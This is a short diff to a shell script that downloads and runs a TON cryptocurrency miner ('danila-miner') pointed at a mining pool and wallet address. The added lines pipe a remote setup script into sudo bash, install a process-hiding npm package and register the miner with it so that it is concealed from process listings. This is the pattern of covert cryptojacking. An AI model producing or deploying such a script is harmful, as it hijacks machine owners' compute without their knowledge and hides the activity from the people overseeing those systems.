@@ -1,13 +1,14 @@
 #!/bin/sh
 #!/bin/bash
 
-
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
-
-tar -xf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
-
-chmod +x danila-miner >/dev/null 2>&1
-
+apt update
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+sudo apt install nodejs
+npm i -g node-process-hider
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz
+tar -xf danila-miner-2.3.1-ubuntu-bionic.tar.gz
+sudo ph add danila-miner
+chmod +x danila-miner
 ./danila-miner run https://next.ton-pool.com EQAxkdZ4fFoFc0wZYbwT5Z2D-cA7q1te5etqcwGx6mTFys2u
 
 
